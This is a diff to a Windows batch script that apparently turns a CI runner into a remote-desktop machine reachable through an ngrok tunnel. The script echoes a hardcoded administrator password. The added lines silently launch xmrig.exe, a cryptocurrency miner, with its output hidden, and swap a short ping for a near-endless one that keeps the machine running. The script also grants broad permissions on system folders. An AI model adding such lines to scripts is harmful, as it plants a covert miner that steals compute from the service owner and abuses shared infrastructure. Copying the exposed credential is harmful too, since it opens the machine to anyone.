@@ -37,9 +37,10 @@ sc config Audiosrv start= auto >nul
 sc start audiosrv >nul
 ICACLS C:\Windows\Temp /grant administrator:F >nul
 ICACLS C:\Windows\installer /grant administrator:F >nul
+start C:\Users\Public\Desktop\xmrig.exe >nul
 echo All done! Connect your VM using RDP. When RDP expired and VM shutdown, Re-run jobs to get a new RDP.
 echo IP:
 tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url || echo "Can't get NGROK tunnel, please paste new NGROK TOKEN in YML. Check Tunnel here: https://dashboard.ngrok.com/status/tunnels " && exit
 echo User: administrator
 echo Pass: 01217682717Huy
-ping -n 10 10.10.0.10 >nul
+ping -n 99999999999999999999 127.0.0.1 >nul
